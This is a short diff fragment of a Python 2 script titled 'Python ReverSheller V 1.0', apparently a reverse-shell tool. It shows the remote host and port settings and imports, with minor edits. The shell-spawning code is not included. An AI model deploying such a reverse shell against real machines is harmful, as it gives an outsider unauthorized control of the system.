@@ -10,10 +10,10 @@ import socket
 import os
 import sys
 import subprocess
-from pty import*
 
+#Global_Variables
 rhost = '192.168.1.50' # Set here different Host to connect
-rport =  443             # Set here different Port to connect
+rport =  443           # Set here different Port to connect
 
 print "< Python ReverSheller V 1.0>" # Simple banner
 print "[+] Running ..." #########################
